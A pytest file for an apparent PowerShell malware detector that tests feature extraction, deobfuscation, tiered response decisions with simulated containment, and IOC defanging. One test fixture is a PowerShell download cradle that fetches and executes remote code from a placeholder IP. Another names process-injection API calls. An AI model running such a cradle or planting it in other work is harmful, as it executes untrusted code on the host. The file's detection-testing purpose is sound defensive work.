import os
import sys

import numpy as np

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))
from psdetect.data import exact_key, skeleton_key  # noqa: E402
from psdetect.features import HANDCRAFTED_NAMES, handcrafted_vector, normalise  # noqa: E402
from psdetect.response import Policy, ResponseEngine, Tier, defang  # noqa: E402

BENIGN = """
<#
.SYNOPSIS
Lists running services.
#>
function Get-RunningService {
    param([string]$Name = '*')
    Get-Service -Name $Name | Where-Object Status -eq 'Running'
}
"""
SUSPICIOUS = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')"


class FixedModel:
    def __init__(self, p):
        self.p = p

    def predict_proba(self, X):
        return np.array([[1 - self.p, self.p] for _ in X])


def test_normalise_folds_case_and_backticks():
    assert normalise("I`Nv`oKe-ExPrEsSiOn") == "invoke-expression"


def test_feature_vector_shape_and_finite():
    v = handcrafted_vector(BENIGN)
    assert v.shape == (len(HANDCRAFTED_NAMES),)
    assert np.isfinite(v).all()


def test_indicators_fire_on_download_cradle():
    names = list(HANDCRAFTED_NAMES)
    v = handcrafted_vector(SUSPICIOUS)
    assert v[names.index("ind_download")] > 0
    assert v[names.index("ind_exec_dynamic")] > 0
    assert handcrafted_vector(BENIGN)[names.index("ind_download")] == 0


def test_skeleton_ignores_variable_renames():
    a = "$abc = 5; Write-Output $abc"
    b = "$xyz = 9; Write-Output $xyz"
    assert skeleton_key(a) == skeleton_key(b)
    assert exact_key(a) != exact_key(b)


def test_policy_tiers():
    event = {"ScriptBlockText": SUSPICIOUS, "ScriptBlockId": "1", "Computer": "WS-1",
             "ProcessId": 4242, "Path": "C:\\t.ps1"}
    assert ResponseEngine(FixedModel(0.1)).handle(event).tier == Tier.ALLOW.name
    assert ResponseEngine(FixedModel(0.5)).handle(event).tier == Tier.ALERT.name
    d = ResponseEngine(FixedModel(0.9)).handle(event)
    assert d.tier == Tier.CONTAIN.name
    kinds = {a["type"] for a in d.actions}
    assert {"terminate_process", "quarantine_file", "block_network_iocs"} <= kinds
    assert all(a["status"] == "simulated" for a in d.actions)
    assert any(t["id"] == "T1105" for t in d.techniques)


def test_isolation_needs_high_impact_technique():
    # Very high score but only download behaviour -> CONTAIN, not ISOLATE.
    event = {"ScriptBlockText": SUSPICIOUS, "ScriptBlockId": "2", "Computer": "WS-2"}
    assert ResponseEngine(FixedModel(0.99), Policy()).handle(event).tier == "CONTAIN"
    inj = {"ScriptBlockText": "[DllImport(\"kernel32.dll\")] VirtualAlloc CreateThread",
           "ScriptBlockId": "3", "Computer": "WS-3"}
    d = ResponseEngine(FixedModel(0.99), Policy()).handle(inj)
    assert d.tier == "ISOLATE" and d.analyst_approval_required


def test_defang():
    assert defang("http://203.0.113.5/a") == "hxxp://203[.]0[.]113[.]5/a"
